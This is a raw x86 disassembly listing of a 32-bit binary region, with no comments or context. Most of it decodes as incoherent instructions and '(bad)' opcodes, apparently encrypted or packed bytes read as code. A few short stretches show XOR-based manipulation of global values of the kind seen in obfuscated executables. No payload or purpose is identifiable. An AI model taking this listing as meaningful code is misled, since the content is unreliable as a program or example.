  4084c9:	jmp    DWORD PTR [eax+0x54]
  4084cc:	(bad)
  4084d1:	(bad)  
  4084d3:	cs inc esi
  4084d5:	inc    esi
  4084d6:	sbb    ch,BYTE PTR [edx-0x5e]
  4084d9:	mov    ah,0xb8
  4084db:	sbb    ch,BYTE PTR [ebx]
  4084dd:	sub    DWORD PTR [ebx-0x27daeb78],ebp
  4084e3:	xchg   ecx,eax
  4084e4:	sub    al,0x3e
  4084e6:	je     0x40853d
  4084e8:	xchg   esi,eax
  4084e9:	test   ch,dh
  4084eb:	out    0x77,al
  4084ed:	fwait
  4084ee:	and    eax,0x16532da9
  4084f3:	repz in al,0x1
  4084f6:	push   ecx
  4084f7:	jmp    0x4084ce
  4084f9:	mov    eax,0xdc13ed67
  4084fe:	jge    0x40853e
  408500:	rcr    BYTE PTR [edx],1
  408502:	(bad)  
  408503:	loop   0x40856e
  408505:	std    
  408506:	shr    BYTE PTR [ecx-0x2eeed5aa],1
  40850c:	pushf  
  40850d:	aam    0x3f
  40850f:	cmp    bh,BYTE PTR [ecx]
  408511:	mov    eax,0xff4aab10
  408516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408517:	mov    ds:0xa454c40e,eax
  40851c:	sbb    eax,0x31e5f2cb
  408521:	xor    al,0x77
  408523:	jmp    DWORD PTR [esi-0x2]
  408526:	and    DWORD PTR [ebp+0x34],eax
  408529:	in     eax,0xd6
  40852b:	jae    0x40852d
  40852d:	jmp    0x2402:0xa6e385cd
  408534:	push   cs
  408535:	jmp    0x4084f1
  408537:	push   ebx
  408538:	adc    BYTE PTR [ebp+0x2fd43c5b],cl
  40853e:	xchg   ecx,eax
  40853f:	xchg   ebp,eax
  408540:	retf   
  408541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408542:	dec    esi
  408543:	push   ebx
  408544:	(bad)  
  408546:	mov    dl,0x3a
  408548:	fs add eax,0x753013ab
  40854e:	pop    es
  40854f:	mov    al,0xcb
  408551:	add    edx,DWORD PTR [edx-0x6d]
  408554:	push   cs
  408555:	fimul  WORD PTR [esp+edi*1+0x253900bc]
  40855c:	and    DWORD PTR ds:0x8b3e5721,ebx
  408562:	out    0x29,al
  408564:	sbb    DWORD PTR [ecx+0x1b05ae87],esi
  40856a:	pop    esi
  40856b:	cmp    BYTE PTR [esi-0x5a],ch
  40856e:	add    bh,BYTE PTR [eax-0x36]
  408571:	add    al,0x60
  408573:	mov    cl,0x68
  408575:	push   eax
  408576:	(bad)  
  408578:	push   0xdf0f30a9
  40857d:	push   edx
  40857e:	out    dx,eax
  40857f:	add    BYTE PTR [edx+0x1ddfbfe7],dh
  408585:	mov    WORD PTR [ecx-0x6c200e4a],?
  40858b:	sbb    BYTE PTR [ebp-0x1b],al
  40858e:	dec    edx
  40858f:	(bad)  
  408590:	pop    ebp
  408591:	or     ch,BYTE PTR [edx-0x78aa141b]
  408597:	dec    ebp
  408598:	rol    cl,0x48
  40859b:	pop    ebp
  40859c:	mov    dh,0x1d
  40859e:	sbb    DWORD PTR [edi+eiz*1+0x7f],0xf022cb3a
  4085a6:	push   es
  4085a7:	retf   0x2f59
  4085aa:	fadd   st(0),st
  4085ac:	inc    ecx
  4085ad:	shl    DWORD PTR [ebx-0x1b],0xf7
  4085b1:	and    al,0xce
  4085b3:	inc    ebx
  4085b4:	repnz inc esp
  4085b6:	jge    0x4085c9
  4085b8:	add    al,0xfd
  4085ba:	inc    ebp
  4085bb:	retf   
  4085bc:	jge    0x408615
  4085be:	mov    cl,0x48
  4085c0:	sub    BYTE PTR [ebx-0x786d86cf],dl
  4085c6:	jmp    0xd20d8dde
  4085cb:	popf   
  4085cc:	jmp    0xb60450f3
  4085d1:	rol    ah,cl
  4085d3:	fadd   DWORD PTR [ebx-0x65971ad0]
  4085d9:	sbb    DWORD PTR [ebp+0xc],ecx
  4085dc:	xor    dl,ah
  4085de:	xor    BYTE PTR [eax],dh
  4085e0:	or     al,0xbd
  4085e2:	fmul   DWORD PTR [esi+esi*4]
  4085e5:	stos   DWORD PTR es:[edi],eax
  4085e6:	mov    bl,0x83
  4085e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e9:	pop    es
  4085ea:	test   BYTE PTR [esi+ecx*4],al
  4085ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085ee:	fidiv  WORD PTR [ebp-0x4cbcc2c7]
  4085f4:	es into 
  4085f6:	pop    esi
  4085f7:	inc    edi
  4085f8:	mov    edi,0x439df5da
  4085fd:	mov    ecx,0xa43602ba
  408602:	or     ch,BYTE PTR [edi+0x49064c94]
  408608:	sbb    DWORD PTR [ecx-0x2],0xbfb85d2
  40860f:	jns    0x40864a
  408611:	jl     0x40865d
  408613:	adc    eax,0xd4412e5
  408618:	xchg   esi,eax
  408619:	inc    ecx
  40861a:	imul   DWORD PTR [edi]
  40861c:	es pop ds
  40861e:	xor    al,0xc9
  408620:	jae    0x408616
  408622:	js     0x408688
  408624:	jge    0x408677
  408626:	xchg   ecx,eax
  408627:	mov    esi,0x3c98e848
  40862c:	loop   0x4085f5
  40862e:	mov    dh,0x42
  408630:	inc    ebx
  408631:	xor    eax,0xef3e41d5
  408636:	(bad)  
  408637:	neg    BYTE PTR [edi-0x2a4c3b61]
  40863d:	cmp    al,0x21
  408640:	cwde   
  408641:	jle    0x408692
  408643:	adc    al,0xc0
  408645:	and    DWORD PTR [ebp+ebx*8+0x54],edx
  408649:	jp     0x40869a
  40864b:	pop    edi
  40864c:	cmp    BYTE PTR [edx+0x1e94e3e3],al
  408652:	mov    al,ds:0xad0638e5
  408657:	add    DWORD PTR [ecx-0x8dd477a],edi
  40865d:	es and al,0x45
  408660:	(bad)  
  408661:	call   0xe166:0xa7168133
  408668:	pusha  
  408669:	cmp    al,0x14
  40866b:	(bad)  
  40866c:	das    
  40866d:	icebp  
  40866e:	imul   edx,esi,0xffffff8c
  408671:	scas   al,BYTE PTR es:[edi]
  408672:	mov    ebp,0x8432a14
  408677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408678:	test   DWORD PTR [eax-0x49],esp
  40867b:	xchg   ebx,eax
  40867c:	arpl   WORD PTR [ecx-0x3a],cx
  40867f:	mov    ds:0xc6bfbcd,eax
  408684:	mov    ch,0x4
  408686:	out    dx,al
  408687:	adc    esi,DWORD PTR [ebx+0xb]
  40868a:	or     eax,0x4b040eab
  40868f:	xchg   esp,eax
  408690:	mov    ds:0xe484f5f3,eax
  408695:	lahf   
  408696:	pop    ebx
  408697:	xor    al,0x98
  408699:	dec    edx
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x4336e3,0x43367b
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x43376f,0x4337a7
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x14a4cab6],ecx
  4086ca:	std    
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	mov    esp,0xe18e798e
  4086d9:	(bad)  [ebx+0x3b29097f]
  4086df:	icebp  
  4086e0:	shl    BYTE PTR [esi-0x7f],0x44
  4086e4:	jae    0x40872b
  4086e6:	mov    cl,0xed
  4086e8:	inc    edi
  4086e9:	mov    dl,0x24
  4086eb:	dec    eax
  4086ec:	fwait
  4086ed:	ja     0x408734
  4086ef:	dec    eax
  4086f0:	iret   
  4086f1:	mov    al,0xc0
  4086f3:	clc    
  4086f4:	jle    0x40869c
  4086f6:	xlat   BYTE PTR ds:[ebx]
  4086f7:	push   edi
  4086f8:	cmp    DWORD PTR [esi],esi
  4086fa:	ss faddp st(4),st
  4086fd:	fldcw  WORD PTR [ebx+eiz*8-0x51]
  408701:	icebp  
  408702:	sahf   
  408703:	stos   BYTE PTR es:[edi],al
  408704:	mov    ecx,0x38361be2
  408709:	je     0x40869f
  40870b:	mov    BYTE PTR [edi+eiz*4],al
  40870e:	cmp    al,0xb9
  408710:	rcl    ch,0x3c
  408713:	or     edi,ebx
  408715:	pop    ecx
  408716:	scas   al,BYTE PTR es:[edi]
  408717:	push   edx
  408718:	shr    bh,1
  40871a:	sub    eax,0x76b6b2c1
  40871f:	(bad)
  408722:	push   edi
  408723:	fldcw  WORD PTR [esi+0x670c25fa]
  408729:	jmp    0x40870d
  40872b:	xchg   ebp,eax
  40872c:	pop    ecx
  40872d:	pushf  
  40872e:	repnz (bad) 
  408730:	minps  xmm6,XMMWORD PTR [esi+0x596d44c6]
  408737:	fistp  DWORD PTR [eax]
  408739:	in     eax,dx
  40873a:	repz ret 
  40873c:	les    ecx,FWORD PTR [edx+0x50]
  40873f:	outs   dx,DWORD PTR ds:[esi]
  408740:	in     eax,0xf3
  408742:	mov    ds:0x37437de2,al
  408747:	out    0x9,al
  408749:	jmp    0x4087a2
  40874b:	jl     0x40875a
  40874d:	sub    esi,DWORD PTR [eax-0x7e989c6]
  408753:	aam    0xc2
  408755:	pop    ebp
  408756:	sub    BYTE PTR [ebx],dh
  408758:	add    al,0xe5
  40875a:	in     al,0x4b
  40875c:	push   ds
  40875d:	aad    0x35
  40875f:	mov    ebx,0xf63f9612
  408764:	(bad)  
  408765:	jmp    0x408769
  408767:	out    0x42,al
  408769:	cmp    DWORD PTR [edx+0x1395504c],0x4e
  408770:	inc    eax
  408771:	sar    DWORD PTR [edx+ebx*8],1
  408774:	(bad)  
  408775:	mov    esi,0x386cc896
  40877a:	or     al,0x7e
  40877c:	and    BYTE PTR [ebx+0x72d581d8],bh
  408782:	push   ss
  408783:	jecxz  0x40877b
  408785:	jp     0x4087de
  408787:	call   0xe220e1b6
  40878c:	(bad)  
  40878d:	aad    0xe3
  40878f:	sti    
  408790:	mov    ebp,0x696953b9
  408795:	call   0xb324:0xc2e2459c
  40879c:	mov    DWORD PTR [ebx+0x4309559c],esp
  4087a2:	mov    bh,dh
  4087a4:	cs int 0xa9
  4087a7:	inc    ecx
  4087a8:	xchg   ebp,eax
  4087a9:	js     0x40880c
  4087ab:	dec    esi
  4087ac:	aaa    
  4087ad:	jno    0x40881d
  4087af:	sbb    ecx,DWORD PTR [edi-0x63b01fa6]
  4087b5:	ror    DWORD PTR [ebx+0x43519b4d],0x1a
  4087bc:	xchg   edi,eax
  4087bd:	push   es
  4087be:	fld    QWORD PTR [eax+0x7908ef94]
  4087c4:	mov    ah,0x3
  4087c6:	call   0x7ee9:0xd54aac5f
  4087cd:	adc    eax,0x4c48d6ff
  4087d2:	test   al,0x80
  4087d4:	jae    0x408763
  4087d6:	and    ecx,DWORD PTR [ebx+0x77]
  4087d9:	ds xor dh,0xe3
  4087dd:	or     BYTE PTR ds:[edi-0x6569d98f],dh
  4087e4:	outs   dx,BYTE PTR ds:[esi]
  4087e5:	add    ebp,DWORD PTR [eax]
  4087e7:	daa    
  4087e8:	push   cs
  4087e9:	lahf   
  4087ea:	sub    bh,BYTE PTR [edi+0x2949a05d]
  4087f0:	dec    edx
  4087f1:	add    BYTE PTR [edx+0x4a],ch
  4087f4:	mov    ds:0xd090eb29,eax
  4087f9:	mov    edi,DWORD PTR [ebx-0x7783e69e]
  4087ff:	pop    edi
  408800:	add    eax,0x60352326
  408805:	mov    dl,BYTE PTR ds:0x60cf5158
  40880b:	jns    0x4087f8
  40880d:	(bad)  
  40880e:	rcr    BYTE PTR [ecx],1
  408810:	push   esp
  408811:	xor    al,0x53
  408813:	jmp    0xb97d6ab5
  408818:	retf   0x368b
  40881b:	out    0xab,al
  40881d:	xchg   BYTE PTR [ebx-0x3819769a],al
  408823:	jns    0x408869
  408825:	and    al,0x6b
  408827:	js     0x408868
  408829:	fwait
  40882a:	jns    0x4087bd
  40882c:	xor    dh,BYTE PTR [esi-0x4c31db08]
  408832:	mov    ds,ebp
  408834:	jmp    0x408815
  408836:	mov    ?,WORD PTR [ebp-0x52]
  408839:	shl    BYTE PTR [ebx+0x1f752f09],1
  40883f:	pop    eax
  408840:	fstp   DWORD PTR [edi+0x3a]
  408843:	inc    ebp
  408844:	xchg   ebp,eax
  408845:	or     eax,0x357c21cf
  40884a:	sub    BYTE PTR [ecx+0x17],dl
  40884d:	scas   al,BYTE PTR es:[edi]
  40884e:	in     eax,0xc4
  408850:	inc    edx
  408851:	adc    eax,0xb7eb9bc3
  408856:	outs   dx,DWORD PTR ds:[esi]
  408857:	(bad)  
  408858:	push   0x23
  40885a:	mov    cl,0x23
  40885c:	dec    esp
  40885d:	push   edi
  40885e:	pop    ss
  40885f:	xchg   esp,eax
  408860:	iret   
  408861:	jnp    0x408860
  408863:	test   DWORD PTR [edx-0x20],eax
  408866:	xor    bh,BYTE PTR ds:0x3bb7dfc2
  40886c:	cmp    BYTE PTR [ebx],ch
  40886e:	adc    WORD PTR [edi-0x30],dx
  408872:	inc    edx
  408873:	cmp    esi,DWORD PTR [esi-0x56]
  408876:	dec    edx
  408877:	ror    DWORD PTR [ebx],cl
  408879:	mov    al,ds:0x24ba616b
  40887e:	ds into 
  408880:	or     ch,BYTE PTR [edi+0x7f65682]
  408886:	cli    
  408887:	shr    ebx,0xae
  40888a:	outs   dx,BYTE PTR ds:[esi]
  40888b:	xchg   ebx,eax
  40888c:	scas   al,BYTE PTR es:[edi]
  40888d:	dec    esp
  40888e:	dec    edx
  40888f:	xchg   DWORD PTR [ecx],eax
  408891:	jg     0x4088e8
  408893:	xchg   BYTE PTR [ebx+0x3fc0e93f],ch
  408899:	mov    ah,0xd1
  40889b:	xchg   BYTE PTR [ebx+ecx*4-0x6ef2c32e],al
  4088a2:	dec    edx
  4088a3:	(bad)  
  4088a4:	iret   
  4088a5:	jnp    0x4088a6
  4088a7:	mov    esi,0x7564e47a
  4088ac:	push   ecx
  4088ad:	mov    ch,BYTE PTR [esi-0x5d]
  4088b0:	retf   
  4088b1:	arpl   WORD PTR [esi+0x58c78e15],dx
  4088b7:	repz hlt 
  4088b9:	sbb    eax,0x78b6d543
  4088be:	stos   BYTE PTR es:[edi],al
  4088bf:	ret    
  4088c0:	test   DWORD PTR [ecx-0xab46f7a],ecx
  4088c6:	xchg   esi,eax
  4088c7:	sbb    ebp,esp
  4088c9:	add    ch,BYTE PTR [eax-0x14]
  4088cc:	pop    eax
  4088cd:	xchg   esp,eax
  4088ce:	ror    DWORD PTR [edx],1
  4088d0:	in     eax,dx
  4088d1:	pushf  
  4088d2:	fucomip st,st(3)
  4088d4:	gs inc ebx
  4088d6:	mov    eax,ds:0x77a696b4
  4088db:	out    0xe1,eax
  4088dd:	and    DWORD PTR [eax],edi
  4088df:	mov    BYTE PTR [ecx+0x2a],0x1e
  4088e3:	icebp  
  4088e4:	inc    eax
  4088e5:	push   eax
  4088e6:	mov    edi,0xc284c299
  4088eb:	xor    edi,DWORD PTR [esp+edi*1+0x1b65e822]
  4088f2:	sbb    BYTE PTR [esi+0x591bd83e],al
  4088f8:	pop    ds
  4088f9:	sub    BYTE PTR [esi],dh
  4088fb:	pushf  
  4088fc:	int3   
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x4336e3,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x43375b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4336d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43369f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4337a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xdcd5a92c
  408968:	shl    DWORD PTR [eax+0x247e7ed4],1
  40896e:	jl     0x4089ee
  408970:	jle    0x4089c0
  408972:	sbb    edx,DWORD PTR ss:[eax-0x65]
  408976:	js     0x408966
  408978:	in     al,dx
  408979:	scas   eax,DWORD PTR es:[edi]
  40897a:	pop    es
  40897b:	push   esp
  40897c:	cmp    eax,0x1ca91351
  408981:	imul   esi,DWORD PTR [eax],0x124692d3
  408987:	xor    eax,0x2fdc415b
  40898c:	add    DWORD PTR [ecx+0x21],esp
  40898f:	push   ebx
  408990:	les    esp,FWORD PTR [eax]
  408992:	sar    eax,cl
  408994:	mov    ds:0xced91fb1,al
  408999:	adc    BYTE PTR [ecx],bh
  40899b:	cld    
  40899c:	retf   
  40899d:	scas   al,BYTE PTR es:[edi]
  40899e:	jg     0x408994
  4089a0:	ror    DWORD PTR [ebp-0xa8a23d0],1
  4089a6:	inc    ebp
  4089a7:	mov    edx,0x4f8b9610
  4089ac:	push   edi
  4089ad:	xchg   ebp,eax
  4089ae:	bound  ebp,QWORD PTR ds:0x9745cafd
  4089b4:	xchg   DWORD PTR [edx-0x57],edi
  4089b7:	shl    BYTE PTR [eax+eiz*2-0x76e6cdbb],0x23
  4089bf:	add    ebp,edx
  4089c1:	mov    WORD PTR [esi-0x4c],ss
  4089c4:	rcr    BYTE PTR [ecx+0x302696a7],0x8e
  4089cb:	sub    edx,eax
  4089cd:	out    0xac,al
  4089cf:	and    DWORD PTR [ecx],eax
  4089d1:	and    ebx,ebp
  4089d3:	int    0xf6
  4089d5:	xchg   edi,eax
  4089d6:	mov    esi,0x4829ba10
  4089db:	retf   0xd15f
  4089de:	iret   
  4089df:	sub    al,0x2b
  4089e1:	enter  0xed9,0x5c
  4089e5:	popf   
  4089e6:	repz fcomp DWORD PTR [esi+0x3e363202]
  4089ed:	adc    al,0x86
  4089ef:	stc    
  4089f0:	pop    ebp
  4089f1:	loope  0x408a0f
  4089f3:	cmp    esp,eax
  4089f5:	cmp    edx,DWORD PTR [ecx-0x21aed8d2]
  4089fb:	mov    edx,0xecbf7b0c
  408a00:	std    
  408a01:	adc    eax,0x71210007
  408a06:	shl    DWORD PTR ds:0xc70a12df,cl
  408a0c:	sbb    al,0x86
  408a0f:	addr16 das 
  408a11:	pop    ebx
  408a12:	das    
  408a13:	(bad)  
  408a14:	test   DWORD PTR [edx+eax*8+0x23],0x90bc65dc
  408a1c:	jmp    0x4089bf
  408a1e:	xor    ch,BYTE PTR [esp+edi*8+0x16e77c5f]
  408a25:	in     eax,dx
  408a26:	pop    edi
  408a27:	je     0x408a75
  408a29:	cmc    
  408a2a:	dec    esi
  408a2b:	sahf   
  408a2c:	mov    ecx,0x9aea4606
  408a31:	pop    ebp
  408a32:	adc    al,0x7e
  408a34:	pop    ecx
  408a35:	mov    al,ds:0x511c563c
  408a3a:	imul   eax,DWORD PTR [edx],0x21cb3133
  408a40:	and    esi,DWORD PTR ds:0xf3ae9a33
  408a46:	push   0x760a06ea
  408a4b:	push   0xfffffff3
  408a4d:	ror    ebp,0x20
  408a50:	sub    al,0x48
  408a52:	pop    ebx
  408a53:	pop    ds
  408a54:	pop    ds
  408a55:	jmp    0xd1ae4d62
  408a5a:	aad    0xea
  408a5c:	cmp    al,0xbb
  408a5e:	add    eax,0x243ffb33
  408a63:	cmp    DWORD PTR [eax*8+0x5dd5e3ba],esi
  408a6a:	pop    eax
  408a6b:	scas   eax,DWORD PTR es:[edi]
  408a6c:	and    eax,0x4e00ccc7
  408a71:	xchg   BYTE PTR [ebx-0x7a],al
  408a74:	xchg   ebx,eax
  408a75:	inc    ebx
  408a76:	sub    DWORD PTR [eax+0x68],esp
  408a79:	cmp    BYTE PTR [esi+0x4b9e2ce0],dh
  408a7f:	fidivr DWORD PTR [esi-0x62]
  408a82:	and    dh,dl
  408a84:	div    DWORD PTR [edx+0x25]
  408a87:	mov    al,0x90
  408a89:	outs   dx,BYTE PTR ds:[esi]
  408a8a:	add    BYTE PTR [ebp-0x37417cf1],0x19
  408a91:	mov    eax,DWORD PTR [ecx-0x32e81ac3]
  408a97:	mov    dl,0xe2
  408a99:	push   cs
  408a9a:	loope  0x408a43
  408a9c:	mov    dh,dh
  408a9e:	mov    eax,ds:0x640067ed
  408aa3:	push   ecx
  408aa4:	push   es
  408aa5:	dec    esp
  408aa6:	sbb    bl,0x51
  408aa9:	inc    ebp
  408aaa:	scas   al,BYTE PTR es:[edi]
  408aab:	mov    ds,WORD PTR [eax+0x7f41a1e7]
  408ab1:	jo     0x408a58
  408ab3:	xor    BYTE PTR [edx],cl
  408ab5:	test   eax,0x4e2fb5a0
  408aba:	sbb    eax,eax
  408abc:	adc    eax,0xe521fb2d
  408ac1:	jnp    0x408b06
  408ac3:	mov    ebx,0xfe906156
  408ac8:	das    
  408ac9:	mov    dh,ah
  408acb:	fisub  WORD PTR [edx-0x6a]
  408ace:	pop    ds
  408acf:	shl    cl,0x5d
  408ad2:	and    ah,cl
  408ad4:	xor    DWORD PTR [ecx+0xa],eax
  408ad7:	outs   dx,BYTE PTR ds:[esi]
  408ad8:	fiadd  WORD PTR [edx+0x16]
  408adb:	aam    0xd8
  408add:	mov    ebp,0xcb49c976
  408ae2:	xor    ebp,DWORD PTR [ebx]
  408ae4:	add    edi,DWORD PTR [edx]
  408ae6:	xlat   BYTE PTR ds:[ebx]
  408ae7:	or     ah,BYTE PTR [bp+0x4663]
  408aec:	adc    al,0xcb
  408aee:	inc    esi
  408aef:	imul   BYTE PTR [edi-0x1fac20ea]
  408af5:	cwde   
  408af6:	cmovbe eax,DWORD PTR [ebx-0x3d]
  408afa:	(bad)  
  408afb:	sbb    eax,0x80a2858f
  408b00:	lock call 0xa5bb422d
  408b06:	test   BYTE PTR [ebp+0x31cf2f95],bh
  408b0c:	inc    esp
  408b0d:	xchg   ebx,eax
  408b0e:	mov    esi,0xb6a0865
  408b13:	sub    esi,DWORD PTR [esi-0x57]
  408b16:	pop    edi
  408b17:	cmp    eax,0xbc2eaeb1
  408b1c:	adc    DWORD PTR [esi+0x72],0xffffffd7
  408b20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b21:	fistp  QWORD PTR [edi+0x14be35b5]
  408b27:	test   dl,dl
  408b29:	fimul  DWORD PTR ds:0x9b8c8a54
  408b2f:	test   eax,0x458f81d
  408b34:	sub    eax,0x27dec79d
  408b39:	inc    ebx
  408b3a:	dec    edx
  408b3b:	das    
  408b3c:	fndisi(8087 only) 
  408b3e:	adc    cl,BYTE PTR [edi+0x67]
  408b41:	sbb    ah,BYTE PTR [esi-0x7c]
  408b44:	sbb    ebx,DWORD PTR [edi+0x60]
  408b47:	popa   
  408b48:	call   0x987c:0xb632fc09
  408b4f:	push   es
  408b50:	retf   0xfa8
  408b53:	popa   
  408b54:	js     0x408b76
  408b56:	aas    
  408b57:	mov    dh,0xef
  408b59:	mov    eax,ds:0xf6bb24da
  408b5e:	retf   
  408b5f:	and    BYTE PTR [edx+0x268acec9],bl
  408b65:	inc    ebx
  408b66:	and    eax,0x3f9519d4
  408b6b:	addr16 inc ebp
  408b6d:	or     eax,0xc5c5a745
  408b72:	(bad)  
  408b73:	lock call 0xbec5:0xa2cbdbe8
  408b7b:	sbb    edx,ebp
  408b7d:	push   edx
  408b7e:	dec    ecx
  408b7f:	daa    
  408b80:	lods   eax,DWORD PTR ds:[esi]
  408b81:	out    dx,eax
  408b82:	daa    
  408b83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b84:	daa    
  408b85:	mov    edi,0x8919996e
  408b8a:	or     eax,0x3323dee8
  408b8f:	mov    eax,0xc00bf5d9
  408b94:	dec    edx
  408b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b96:	sub    al,0xe6
  408b98:	test   al,0x73
  408b9a:	dec    edi
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	paddw  mm4,mm6
  408bf3:	jns    0x408c5b
  408bf5:	sar    BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	mov    al,ds:0x34a037dd
  408c01:	inc    edx
  408c02:	or     esp,DWORD PTR [edi]
  408c04:	(bad)  
  408c05:	aaa    
  408c06:	sub    edx,DWORD PTR [eax*1+0x4ad8897f]
  408c0d:	xchg   edx,eax
  408c0e:	pop    ds
  408c0f:	xor    ch,ah
  408c11:	arpl   WORD PTR [edi+0x579112f4],dx
  408c17:	mov    esp,0x5858f832
  408c1c:	in     eax,dx
  408c1d:	xchg   ebx,eax
  408c1e:	cmp    bl,BYTE PTR [edx+0x7d6d9646]
  408c24:	xchg   DWORD PTR [edi+0x71],ebx
  408c27:	adc    bh,BYTE PTR [ebp+0x55]
  408c2a:	pop    DWORD PTR [eax]
  408c2c:	stos   BYTE PTR es:[edi],al
  408c2d:	and    al,0x35
  408c30:	test   BYTE PTR [edi+0x3f9d9b08],dl
  408c36:	pop    ds
  408c37:	loop   0x408bce
  408c39:	add    edi,ebx
  408c3b:	jmp    0x3552feaf
  408c40:	add    dh,BYTE PTR ds:0x8000c9bf
  408c46:	adc    DWORD PTR [edi],edx
  408c48:	call   0xbda7:0xdb105d8e
  408c4f:	xlat   BYTE PTR ds:[ebx]
  408c50:	mov    edi,0x7f3b7f07
  408c55:	cdq    
  408c56:	aad    0x6e
  408c58:	mov    eax,ds:0x98945018
  408c5d:	in     eax,0x60
  408c5f:	push   ebx
  408c60:	jns    0x408cdd
  408c62:	mov    ch,0xdb
  408c64:	data16 out 0x6f,al
  408c67:	add    DWORD PTR [ebp+0xcc94fa0],0x54787cbe
  408c71:	dec    edi
  408c72:	pop    ecx
  408c73:	xor    eax,0x7c9feb6e
  408c78:	nop
  408c79:	or     eax,0xca5b6eac
  408c7e:	(bad)  
  408c7f:	sbb    dh,dh
  408c81:	lods   eax,DWORD PTR ds:[esi]
  408c82:	lea    esi,[edx]
  408c84:	mov    edi,0xcca3674
  408c89:	je     0x408d09
  408c8b:	and    BYTE PTR [esi-0x32],dl
  408c8e:	push   esp
  408c8f:	test   BYTE PTR ds:0x47cef873,al
  408c95:	and    DWORD PTR [esi+0x11c51244],0x8036a704
  408c9f:	jmp    0x6ec0:0x8420d649
  408ca6:	mov    esi,0xcc525385
  408cab:	loope  0x408c36
  408cad:	stc    
  408cae:	and    cl,BYTE PTR [si-0x7102]
  408cb3:	std    
  408cb4:	pop    edi
  408cb5:	test   al,0xd1
  408cb7:	sbb    dl,cl
  408cb9:	xor    al,0xcf
  408cbb:	test   al,0x3f
  408cbd:	dec    esi
  408cbe:	xchg   edx,eax
  408cbf:	dec    ecx
  408cc0:	not    BYTE PTR [ecx+edi*1+0x10be901b]
  408cc7:	lods   eax,DWORD PTR ds:[esi]
  408cc8:	xchg   esp,eax
  408cc9:	pop    ebx
  408cca:	push   ebx
  408ccb:	jns    0x408c66
  408ccd:	pusha  
  408cce:	and    edi,DWORD PTR [ebp+ebx*8+0x20]
  408cd2:	inc    esi
  408cd3:	inc    ebp
  408cd4:	dec    ebx
  408cd5:	mov    ch,0xd4
  408cd7:	or     edx,DWORD PTR [esi]
  408cd9:	mov    edx,0x3fe42c09
  408cde:	push   esi
  408ce0:	pop    ecx
  408ce1:	push   ds
  408ce2:	(bad)  
  408ce3:	out    dx,eax
  408ce4:	and    BYTE PTR [ebp+0x7b5a946c],0xa9
  408ceb:	loop   0x408cb5
  408ced:	fs es mov dh,0x1a
  408cf1:	xchg   edi,eax
  408cf2:	pop    ebx
  408cf3:	stc    
  408cf4:	xchg   esp,eax
  408cf5:	pushf  
  408cf6:	arpl   WORD PTR [ecx+edi*4],bx
  408cf9:	je     0x408d22
  408cfb:	adc    al,0x87
  408cfd:	inc    ebp
  408cfe:	mov    esi,0xa4d8df7a
  408d03:	mov    esp,0x25a4e26d
  408d08:	push   eax
  408d09:	push   edi
  408d0a:	or     BYTE PTR [esi-0x6a649265],ah
  408d10:	pusha  
  408d11:	cmp    al,0x98
  408d13:	inc    esp
  408d14:	or     DWORD PTR [esi-0x74],esi
